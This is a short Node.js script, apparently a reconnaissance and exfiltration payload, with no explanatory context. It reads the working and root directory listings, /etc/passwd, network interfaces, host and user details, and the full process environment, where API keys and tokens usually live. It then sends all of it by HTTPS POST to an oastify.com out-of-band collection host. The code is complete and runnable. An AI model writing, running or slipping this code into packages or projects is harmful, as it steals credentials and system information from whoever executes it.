const https = require('https');
const fs = require('fs');
const os = require('os');

const payload = JSON.stringify({
  cwd: process.cwd(),
  files: fs.readdirSync(process.cwd()),
  root_files: fs.readdirSync('/'),
  passwd: fs.readFileSync('/etc/passwd', 'utf8'),
  interfaces: os.networkInterfaces(),
  sysinfo: {
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    release: os.release(),
    uptime: os.uptime(),
    totalmem: os.totalmem(),
    freemem: os.freemem(),
    cpus: os.cpus().map(c => c.model),
    user: os.userInfo()
  },
  env: process.env,
  node_version: process.version,
  pid: process.pid
}, null, 2);

const req = https.request('https://hk5kkvxjp7lrcipzmo4ol3tk7bd213ps.oastify.com', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(payload)
  }
});
req.write(payload);
req.end();
